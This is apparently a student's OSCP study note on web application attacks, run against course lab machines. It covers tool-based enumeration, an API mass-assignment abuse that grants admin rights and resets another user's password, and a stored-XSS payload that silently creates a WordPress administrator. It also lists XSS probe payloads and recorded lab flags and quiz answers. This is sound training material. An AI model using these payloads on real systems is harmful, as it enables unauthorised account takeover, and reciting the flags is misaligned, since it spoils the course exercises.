# Module 8: Introduction to Web Application Attacks

## Tags
#OSCP #Module8 #WebApplicationAttacks #Nmap #Wappalyzer #Gobuster #BurpSuite #XSS #API #OWASP

---

## **Why This Module Matters**
Modern web frameworks make it easy to spin up applications fast. That speed comes at a cost though: a large attack surface, made up of dependencies, insecure configs, immature codebases, and business-logic flaws.

This module covers the black-box web app testing workflow end to end. How to fingerprint and enumerate a target, the core tools of the trade (Nmap, Wappalyzer, Gobuster, Burp Suite), and then a full walkthrough of one of the most common and dangerous vulnerability classes: Cross-Site Scripting (XSS), including using it to escalate all the way to admin.

**✅ Status:** Fully written up. 8.1 through 8.5 complete, all labs answered.

---

## 8.1. Web Application Assessment Methodology

Before enumerating or exploiting anything, it's worth knowing *what kind* of test you're actually running. It changes how much legwork enumeration requires.

**Three testing approaches, by how much information you're given:**
- **White-box testing.** Full access to source code, infrastructure, and design docs. Most thorough, but requires source-code/logic-review skills, and takes longer relative to codebase size.
- **Black-box testing** (a.k.a. zero-knowledge test). No information given at all, you invest heavily in enumeration first. Typical of bug bounty engagements. **This module focuses on black-box testing.**
- **Grey-box testing.** Somewhere in between: limited info like scope, auth methods, or credentials.

**OWASP Top 10:** the OWASP Foundation periodically publishes a list of the most critical web application security risks. This module (and the ones following it) will work through exploiting several vulnerabilities from that list. They're the basic building blocks for more advanced attacks covered later in the course.

#### Tags: #WhiteBoxTesting #BlackBoxTesting #GreyBoxTesting #OWASPTop10

---

## 8.2. Web Application Assessment Tools

Before diving into enumeration technique, it's worth getting familiar with the actual tools. **Nmap** (revisited for web-specific enumeration), **Wappalyzer** (technology stack fingerprinting), **Gobuster** (directory/file brute forcing), and **Burp Suite** (the workhorse web proxy for the rest of this course).

#### Tags: #WebAppTools

---

### 8.2.1. Fingerprinting Web Servers with Nmap

The web server itself is the common denominator of any web application, so it's the natural starting point.

**Step 1: Identify the web server banner with a service scan**
```bash
sudo nmap -p80 -sV 192.168.50.20
```
*Expect output like:*
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

**Step 2: Go further with a web-specific NSE script**
```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
```
*`http-enum` fingerprints the web server and looks for common interesting paths. Expect output like:*
```
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

🔁 **Similar to:** this is the same NSE machinery covered back in [[Information Gathering#6.4.3. Port Scanning with Nmap|Module 6, 6.4.3 (Port Scanning with Nmap)]] and [[Vulnerability Scanning#7.3. Vulnerability Scanning with Nmap|7.3 (Vulnerability Scanning with Nmap)]]. Same `--script` category/name syntax, same `script.db`. Just applied here with a web-enumeration-flavored script (`http-enum`) instead of `vuln`/`vulners`.

#### Tags: #NmapWebFingerprint #HttpEnum #BannerGrabbing

---

### 8.2.2. Technology Stack Identification with Wappalyzer

Wappalyzer passively identifies a site's OS, UI framework, web server, and JavaScript libraries via a free online Technology Lookup. No active traffic against the target required.

🔁 **Similar to:** Wappalyzer was already introduced back in [[Information Gathering#6.2.3. Netcraft|Module 6, 6.2.3 (Netcraft)]] as a *passive* recon tool. Same tool, same purpose here. Knowing a JS library's exact version can flag known CVEs in that library.

> ⚡ **Modern tool:** both 8.2.1's banner grab and this Wappalyzer lookup are single-host, single-tool-at-a-time steps. [[Httpx]] does status code + page title + tech-stack fingerprinting in one pass, and across a whole list of hosts at once, worth reaching for once there's more than one target to fingerprint.

#### Tags: #Wappalyzer #TechStackFingerprinting #PassiveRecon #JSLibraries

---

### 8.2.3. Directory Brute Force with Gobuster

Once a web server/app is confirmed, the next step is mapping its files and directories. Gobuster automates this via wordlist-based brute forcing.

> **Caution:** Gobuster's brute-forcing nature is noisy. Not suitable for stealth engagements.

**Step 1: Run a directory brute force scan**
```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```
*`-u` = target, `-w` = wordlist, `-t` = thread count (lower means quieter/slower). Expect output like:*
```
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]
```
*`403` means it exists but is forbidden. `301`/`302` means a redirect (directory or moved page). Anything else is worth investigating further.*

> ⚡ **Modern tool:** [[Feroxbuster]] does the same wordlist-based discovery but recurses into subdirectories automatically instead of needing a manual re-run per discovered folder. [[Ffuf]] is the more flexible option when the fuzz point isn't a plain URL path (a header, a POST field, an extension list).

#### Tags: #Gobuster #DirectoryBruteForce #DirbWordlist

---

### 8.2.4. Security Testing with Burp Suite

Burp Suite Community Edition is the GUI web-testing platform used throughout the rest of this course. A proxy that sits between your browser and the target, letting you inspect and modify every request/response.

**Step 1: Launch Burp Suite**
```bash
burpsuite
```
*Or via Kali menu: Applications → 03 Web Application Analysis → burpsuite. Ignore the JRE compatibility warning, Kali's shipped Java version is always tested against it.*

**Step 2: Start a project**
Choose **Temporary project** → Next → leave **Use Burp defaults** selected → **Start Burp**.

**Step 3: Turn off Intercept**
Go to the **Proxy** tab → **Intercept** sub-tab → toggle it off.
*With Intercept on, you'd have to manually click Forward on every single request. Fine for a request you want to tamper with, tedious for just browsing.*

**Step 4: Confirm the listener port**
Proxy → **Options** sub-tab. *Default listener is `127.0.0.1:8080`. This is what your browser needs to point at.*

**Step 5: Point Firefox at the Burp proxy**
In Firefox: `about:preferences#general` → scroll to **Network Settings** → **Settings** → choose **Manual proxy configuration** → HTTP Proxy `127.0.0.1` port `8080` → enable **also for HTTPS** (use this proxy for all protocols).

**Step 6: Browse and observe**
Browse to the target site, then check **Burp → Proxy → HTTP History**. Every request your browser made should now be listed, each one inspectable in full (request left pane, response right pane).

> **Tip. Noisy `detectportal.firefox.com` entries:** go to `about:config`, accept the risk warning, search `network.captive-portal-service.enabled`, set it to `false`.

**Burp Repeater** resends and modifies any captured (or hand-crafted) request repeatedly, reviewing the response each time. Right-click a request in HTTP History → **Send to Repeater** → click **Send**.

**Burp Intruder** automates attacks across a range of payloads (brute force, fuzzing, etc). Needs a stable hostname first if the target uses one internally:

**Step 7: Add a static hosts entry for a target hostname**
```bash
echo "192.168.50.16 offsecwp" | sudo tee -a /etc/hosts
```

**Step 8: Capture a login attempt, send it to Intruder**
Browse to the login page, submit a dummy login (e.g. `admin`/`test`), find the resulting POST request in **Proxy → HTTP History**, right-click → **Send to Intruder**.

**Step 9: Mark the payload position**
In **Intruder → Positions**, click **Clear** to remove all auto-marked positions, then select just the password field's value and click **Add**. This tells Intruder to vary *only* that field.

**Step 10: Provide a wordlist**
In **Intruder → Payloads**, paste in candidate passwords (e.g. the first handful of lines from `rockyou.txt`) under **Payload Options: [Simple list]**.

**Step 11: Launch and inspect results**
Click **Start attack**. *Look for a response with a different status code/length than the rest. That's the hit. Confirm by logging in with it directly.*

> **Caution:** if Firefox is set to proxy through Burp and Burp is closed, Firefox will stop working until you either restart Burp or revert the proxy setting.

#### Tags: #BurpSuite #BurpProxy #BurpRepeater #BurpIntruder #EtcHosts #PasswordBruteForce

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| Which Burp tool best suits brute forcing a 4-digit SMS 2FA keyspace? | **Intruder** |
| HTTP response code Gobuster shows for a redirection during dir brute force? | **301** |
| Default port Burp Proxy listens on? | **8080** |
| DIRTBUSTER site (Module Exercise VM #1). Flag after finding + logging into the hidden admin portal? | **OS{bc86b454747f947aa80e882c0c4e9536}** |
| DIRTBUSTER changed creds (Module Exercise VM #2). Brute forced `admin`'s new password from `passwords.txt`, flag after login? | **OS{45815439d68d307517ee9ff95330f701}** |

#### Tags: #Lab #Quiz #Module8

---

## 8.3. Web Application Enumeration

With the toolset covered, this section focuses on digging into an application itself. Debugging page content, inspecting headers/sitemaps, and probing APIs.

#### Tags: #WebAppEnumeration

---

### 8.3.1. Debugging Page Content

**URL clues:** file extensions (`.php`, `.jsp`, `.do`) can hint at the backend language, though modern route-based frameworks make this less reliable, since a URI no longer has to map to a literal file.

**Firefox Debugger (Web Developer menu):** shows page resources/content. JS frameworks, hidden input fields, HTML comments, client-side validation logic. Minified JS can be cleaned up with the **Pretty print source** button (the `{}` icon) for readability.

**Firefox Inspector:** right-click any page element → **Inspect** to jump straight to its HTML in the DOM tree. Handy for spotting hidden form fields quickly.

#### Tags: #FirefoxDebugger #FirefoxInspector #PrettyPrint #HiddenFormFields

---

### 8.3.2. Inspecting HTTP Response Headers and Sitemaps

**Firefox Network tool (Web Developer menu):** shows requests/responses from the moment it's opened onward. Refresh the page after opening it to capture traffic. Click a request → look at its **response headers**.

**The `Server` header** often reveals the web server software (and sometimes its version). Non-standard headers (historically prefixed `X-`, though RFC6648 now discourages that) can leak stack details too. For example `x-amz-cf-id` implies Amazon CloudFront is in front of the app.

**Sitemaps and `robots.txt`:** sitemap files help search engines crawl a site. `robots.txt` instead tells crawlers what *not* to index, often sensitive/admin paths, exactly what's interesting to a pentester.

**Step 1: Pull a target's robots.txt**
```bash
curl https://www.google.com/robots.txt
```
*Look at the `Disallow:` lines specifically. Those are the paths the site owner didn't want indexed.*

#### Tags: #HTTPResponseHeaders #ServerHeader #NonStandardHeaders #RobotsTxt #Sitemap

---

### 8.3.3. Enumerating and Abusing APIs

REST APIs are common in custom-built web apps. In a black-box test you won't get documentation, you have to discover the API surface yourself.

**Step 1: Brute force API paths with a version-number pattern**
Create a pattern file (e.g. `pattern`) containing:
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```
Then run:
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
*`{GOBUSTER}` is a placeholder Gobuster substitutes with each wordlist entry, then appends the version suffix from the pattern file. Expect hits like:*
```
/books/v1             (Status: 200) [Size: 235]
/users/v1             (Status: 241)
```

**Step 2: Probe a discovered endpoint directly**
```bash
curl -i http://192.168.50.16:5002/users/v1
```
*Look for a JSON body listing user objects, often including an `admin` account worth further investigation.*

**Step 3: Brute force sub-paths under a specific user**
```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```
*Look for entries returning `405 METHOD NOT ALLOWED` rather than `404`. That means the path exists, just not for the HTTP method (`GET`) Gobuster/curl defaults to.*

**Step 4: Try a different HTTP method against that path**
```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
```
*A `405` here confirms the endpoint exists but wants a different verb. Worth trying `POST`/`PUT` explicitly next.*

**Step 5: Register a new (possibly privileged) account**
```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```
*If the API doesn't validate/strip an unexpected `admin` field from the request body, you may have just registered yourself as an administrator. A classic mass-assignment / logic flaw.*

**Step 6: Log in as the new account and grab the auth token**
```bash
curl -d '{"password":"lab","username":"offsec"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```
*Look for a JWT in the response (`auth_token`).*

**Step 7: Use the token to change another user's password**
```bash
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <token>' \
  -d '{"password": "pwned"}'
```
*No error response usually means success. Confirm by logging in as `admin` with the new password.*

> 🔗 **HackTricks** Web API Pentesting: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/web-api-pentesting.md), general API pentesting methodology (auth vs authz, privilege-level testing). Checked directly: it doesn't have a dedicated mass-assignment section specifically, worth knowing before expecting one.
> *(No dedicated "API Security" page found on PayloadsAllTheThings after checking, only OWASP-adjacent references. Its closest relevant content, JSON Web Token and OAuth Misconfiguration, live as separate top-level folders if a JWT/OAuth angle comes up instead.)*

Once you've mapped some API calls manually via `curl`, the same requests can be recreated inside Burp (`--proxy 127.0.0.1:8080` on the curl command, or built directly in Repeater) so they're saved to Burp's **Target → Site map** for later reference.

> ⚡ **Modern tool:** [[Kiterunner]] automates exactly the Step 1 guessing game above, but with wordlists built from real OpenAPI/Swagger specs instead of a generic directory wordlist, and it tries the correct HTTP method per route (catching a `405`-only endpoint like Step 3's automatically, not just `GET`).

#### Tags: #APIEnumeration #RESTAPI #GobusterPattern #MassAssignment #JWT #BurpSiteMap

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| Walkthrough VM #1. Flag found inspecting HTML source of offsecwp? | **OS{d54933b7f533f95e431b0b69646c6a11}** |
| Walkthrough VM #2. Name of the item belonging to `admin` on a second API sharing `/users/v1`'s pattern? | **bookTitle22** |
| Exercise VM #1. Maps-themed site flag? | **OS{59484d103cc6d2f22fcfb278fa3ab74d}** |
| Exercise VM #2. Flag found via URL-level inspection? | **OS{d0870a786e4a5880b9b898afee140965}** |
| Exercise VM #3. Flag found via non-standard HTTP headers? | **OS{359809f5c4cc7e4f7fc3b2eb6e0cd05c}** |
| Exercise VM #4. Flag found reviewing HTML/CSS/JS ("the three web amigos")? | **OS{ac0842ea59731fc9b836871853a1cbb2}** |

#### Tags: #Lab #Quiz #Module8

---

## 8.4. Cross-Site Scripting

XSS exploits a browser's trust in a website by injecting content that the browser then executes in the context of *another* user's session. Missing input sanitization turned into a serious client-side attack vector.

#### Tags: #XSS

---

### 8.4.1. Stored vs Reflected XSS Theory

- **Stored (Persistent) XSS.** The payload is saved server-side (DB, cache) and served to *every* visitor of the affected page. Common in forums, comments, product reviews. One vuln attacks *all* users.
- **Reflected XSS.** The payload lives in a crafted request/link. The app reflects it straight back into the response. Only affects whoever submits that specific request or clicks that specific link. Common in search fields and error messages.
- **DOM-based XSS.** A variant of either, where the vulnerability manifests purely in how the page's Document Object Model gets modified client-side with user-controlled data, rather than in the server's rendered HTML.

All variants execute in the *victim's browser*, under that browser's session. Impact ranges from session hijacking to forced redirects to full account takeover.

#### Tags: #StoredXSS #ReflectedXSS #DOMBasedXSS #PersistentXSS

---

### 8.4.2. JavaScript Refresher

A quick primer since XSS payloads are JavaScript:

```javascript
function multiplyValues(x,y) {
  return x * y;
}

let a = multiplyValues(3, 5)
console.log(a)
```
*JavaScript is loosely typed. `a`'s type (`Number`) is inferred from what's passed in, not declared up front.*

**Try it yourself:** open Firefox's **Web Console** (Web Developer menu, or `Ctrl+Shift+K`) on `about:blank` (avoids clutter from a page's own scripts) and paste code directly in to test it.

#### Tags: #JavaScriptBasics #BrowserConsole #LooseTyping

---

### 8.4.3. Identifying XSS Vulnerabilities

Look for input fields whose value later gets echoed back unsanitized into a page. Test with special characters and see what survives:
```
< > ' " { } ;
```
- `<` `>` are HTML tag delimiters
- `{` `}` are JavaScript function/block delimiters
- `'` `"` are string delimiters
- `;` is a statement terminator

If the app doesn't strip or **encode** these (HTML encoding, e.g. `&lt;` for `<`, or URL/percent encoding, e.g. `%20` for a space), it may be interpreting your input as *code* rather than *data*. That's the core of an XSS bug. Which characters you actually need depends on *where* your input lands in the page. Inside a `<div>` vs. inside an existing `<script>` block need different payload shapes.

#### Tags: #XSSSpecialCharacters #HTMLEncoding #URLEncoding #InputSanitization

---

### 8.4.4. Basic XSS

Demonstrated against an OffSec WordPress instance running the **Visitors** plugin (logs visitor IP/User-Agent, vulnerable to stored XSS).

**Root cause (from the plugin's own source):**
```php
'useragent' => $_SERVER['HTTP_USER_AGENT'],
```
saved straight to the DB, then rendered back out with zero sanitization:
```php
<td>'.$record->useragent.'</td>
```
Since the `User-Agent` HTTP header is entirely attacker-controlled, it's a direct stored-XSS injection point.

**Step 1: Capture a request in Burp and send it to Repeater**
With Burp proxying and Intercept off, browse to the target, find the request in **Proxy → HTTP History**, right-click → **Send to Repeater**.

**Step 2: Replace the User-Agent value with a test payload**
```
<script>alert(42)</script>
```
Send the request. *A `200 OK` response means the payload is now stored in the WordPress database.*

**Step 3: Trigger it as the admin**
Log in as `admin`/`password` at `/wp-login.php`, then visit the Visitors plugin dashboard:
```
http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php
```
*A JavaScript alert popup showing `42` confirms the payload executed in the admin's browser.*

> Even though this example was found via source review (white-box), the same bug is just as discoverable black-box, by fuzzing HTTP headers and observing what comes back unfiltered.

#### Tags: #StoredXSSExample #VisitorsPlugin #UserAgentInjection #BurpRepeaterXSS

---

### 8.4.5. Privilege Escalation via XSS

**Cookie theft doesn't work here.** Checked via Firefox DevTools → **Storage → Cookies**: WordPress's session cookies all carry the **HttpOnly** flag (blocks JS access), so a simple "steal the cookie" XSS payload is a dead end. (The **Secure** flag, for reference, would instead restrict a cookie to HTTPS-only transmission, a separate protection.)

**New angle: make the admin's browser create a new admin account for us**, using the same stored-XSS injection point.

**WordPress nonces and CSRF:** a **nonce** is a per-request random token WordPress uses to block CSRF. These are attacks where a victim is tricked (e.g. via a disguised link) into unknowingly submitting a request that performs an action on a site they're already logged into. A nonce blocks *blind* CSRF, but doesn't stop us here, because our stored XSS payload runs *inside* the legitimate admin session and can fetch a valid nonce itself before acting.

**Step 1: Fetch a valid nonce via JS, inside the victim's session**
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**Step 2: Use the nonce to create a backdoor admin account**
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

**Step 3: Minify the combined JS**
Paste both snippets combined into **JS Compress** (or similar minifier) to collapse it to one line. This makes it easier to smuggle through a single header value.

**Step 4: Encode the minified JS to a `String.fromCharCode` sequence**
```javascript
function encode_to_javascript(string) {
  var input = string
  var output = '';
  for(pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if(pos != (input.length - 1)) { output += ","; }
  }
  return output;
}

let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
Run this in the browser console (same trick as 8.4.2) against your minified payload to get a comma-separated list of character codes.

> 🔗 **CyberChef** (has "To Charcode"/"From Charcode" operations): [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) can do this same string-to-char-code encoding (and the matching decode) without writing a custom JS helper.

**Step 5: Wrap the encoded payload and fire it as the User-Agent via curl**
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<encoded_values_here>))</script>" --proxy 127.0.0.1:8080
```
*With Burp's Intercept **on**, inspect the request, then **Forward** it and turn Intercept back off.*

**Step 6: Trigger execution and confirm**
Log in as the real admin, open the Visitors plugin dashboard (this executes the stored payload), then check **Users** in the WordPress admin sidebar.
*A new `attacker` account with the `administrator` role confirms the privilege escalation succeeded.*

🔁 **Similar to:** the "automated detection vs. manual confirmation" theme from [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]] (Nmap NSE flags a vuln, `curl` confirms it) shows up again here in reverse. This time XSS is the *exploitation* step, and logging in as the new admin account is the *confirmation* step.

> 🔗 **PayloadsAllTheThings** XSS Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), extensive XSS payload/cheat-sheet (different injection contexts, filter bypasses, polyglots). Worth bookmarking for boxes where the basic `<script>alert()</script>` test gets filtered.
> 🔗 **ippsec.rocks**: [ippsec.rocks](https://ippsec.rocks/) is worth searching for a video walkthrough of WordPress stored-XSS-to-admin chains like this one *(linking to the tool itself, its search-query deep-links are JS-driven and can't be verified by an automated fetch)*.

From here, the natural next step (covered in a later module) is using admin access to upload a custom WordPress plugin containing a web shell, for full host access.

#### Tags: #XSSPrivilegeEscalation #WordPressNonce #CSRF #JWTAuth #EvalExploit #HttpOnlyCookie

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| Walkthrough VM #1. Which other HTTP header is similarly vulnerable (based on the Visitors plugin source)? | **X-Forwarded-For** |
| Walkthrough VM #2. JS method that interprets a string as code and executes it? | **`eval()`** |
| Capstone (Module Exercise VM #1). Add admin account, embed web shell in a plugin, upgrade to full reverse shell, flag in `/tmp/`? | **OS{76c142c78b2c618f22f06db7b6e7497c}** |

#### Tags: #Lab #Quiz #Module8

---

## 8.5. Wrapping Up

This module covered identifying and enumerating common web application vulnerabilities: API misconfigurations (mass assignment via an unexpected `admin` field) and stored XSS. Then it chained a stored XSS bug all the way to full administrative access via a crafted HTTP request. The common denominator across both: **trusting user-controlled input without validating or sanitizing it.**

#### Tags: #WebAppAttacksSummary

---

## 📋 Command Reference: Web Enumeration & XSS
[[Linux Methodology#Step 2: Web Application Enumeration]]

```bash
# Web server fingerprinting
nmap -p80 -sV <target>
nmap -p80 --script=http-enum <target>
whatweb http://<target>

# Directory / file brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 10
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,bak

# API path brute force (with version-number pattern file containing {GOBUSTER}/v1 etc.)
gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern

# robots.txt / sitemap check
curl http://<target>/robots.txt

# Manual API probing
curl -i http://<target>/<endpoint>
curl -X PUT -d '{"key":"value"}' -H 'Content-Type: application/json' http://<target>/<endpoint>
curl --proxy 127.0.0.1:8080 http://<target>/<endpoint>   # route through Burp

# Quick XSS probe payloads (test in an input field, then view source/output)
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

# XSS payload delivery via a header (e.g. User-Agent) using curl + Burp
curl -i http://<target> --user-agent "<script>alert(1)</script>" --proxy 127.0.0.1:8080
```

> 🔗 For a much larger set of ready-made XSS payloads beyond the quick probes above: **PayloadsAllTheThings** XSS Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md). For API probing: **HackTricks** Web API Pentesting: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/web-api-pentesting.md).

---

## 🎯 Related Boxes to Practice

Real HTB machines matching this module's XSS content, verified against actual writeups (not guessed).

- **[Cat](https://0xdf.gitlab.io/2025/07/05/htb-cat.html)** (HTB, Linux, Medium): stored XSS in a cat-registration feature steals a non-HttpOnly admin cookie, chained into SQLi and RCE. Directly comparable to [[Introduction to Web Application Attacks#8.4.5. Privilege Escalation via XSS|8.4.5]]'s cookie-theft-vs-HttpOnly discussion. Also relevant to [[SQL Injection Attacks]].
- **Alert** (HTB, Linux, Easy): XSS in a "Contact Us" form, plus a file-upload path.
- **Guardian** (HTB, Linux, Hard): XSS, XSS-via-cookie, and CSRF, a harder combo of the exact concepts in [[Introduction to Web Application Attacks#8.4.5. Privilege Escalation via XSS|8.4.5]] (WordPress nonces/CSRF).
- **Trickster** (HTB, Linux, Medium): XSS.

*None of these four were individually cross-checked against the current TJ_Null/NetSecFocus list (the sheet only partially loaded during research), so treat them as "real, sourced XSS boxes" rather than confirmed "OSCP-like," unlike the TJ_Null-confirmed picks in other modules.*

#### Tags: #RelatedBoxes #HTBPractice

---

## **Outstanding Sections**
- [x] **8.1 Web Application Assessment Methodology**: done
- [x] **8.2 Web Application Assessment Tools**: done (Nmap, Wappalyzer, Gobuster, Burp Suite)
- [x] **8.3 Web Application Enumeration**: done (page debugging, headers/sitemaps, API abuse)
- [x] **8.4 Cross-Site Scripting**: done (theory, JS refresher, identification, basic XSS, privesc)
- [x] **8.5 Wrapping Up**: done
